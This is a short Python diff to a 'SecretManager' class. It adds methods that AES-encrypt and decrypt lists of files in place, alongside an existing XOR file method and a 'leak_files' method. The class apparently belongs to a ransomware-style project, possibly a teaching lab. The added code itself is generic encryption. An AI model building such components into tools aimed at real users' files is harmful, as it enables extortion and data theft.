@@ -12,6 +12,8 @@ from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 
 from xorcrypt import xorfile
 
+from aescrypt import aes_encrypt_file, aes_decrypt_file
+
 class SecretManager:
     ITERATION = 48000
     TOKEN_LENGTH = 16
@@ -119,6 +121,20 @@ class SecretManager:
                 xorfile(file_path, self._key)
             except Exception as e:
                 self._log.error(f"Erreur lors du chiffrement du fichier {file_path}: {e}")
+
+    def aesfiles(self, files: List[str]) -> None:
+        for file_path in files:
+            try:
+                aes_encrypt_file(file_path, self._key)
+            except Exception as e:
+                self._log.error(f"Erreur lors du chiffrement du fichier {file_path}: {e}")
+
+    def unaesfiles(self, files: List[str]) -> None:
+        for file_path in files:
+            try:
+                aes_decrypt_file(file_path, self._key)
+            except Exception as e:
+                self._log.error(f"Erreur lors du déchiffrement du fichier {file_path}: {e}")
 
 
     def leak_files(self, files: List[str]) -> None:
